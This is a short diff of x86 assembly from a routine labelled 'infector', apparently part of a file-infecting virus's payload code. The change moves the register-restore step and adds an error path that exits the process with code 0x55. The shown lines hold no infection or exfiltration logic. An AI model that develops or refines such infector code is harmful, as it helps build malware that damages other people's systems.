@@ -77,9 +77,14 @@ infector:
     mov     eax, 6          ; sys_close
     int     0x80            
 
-.error:
-    popad                   ; Restore registers
+    popad                   ; Restore registers on successful run
     pop     ebp
     ret
+
+.error:
+    ; The open failed. Exit immediately via direct system call.
+    mov     eax, 1          ; sys_exit syscall number
+    mov     ebx, 0x55       ; Exit code 0x55
+    int     0x80            ; Invoke kernel
     
 code_end:                   ; Marker for the end of the payload code
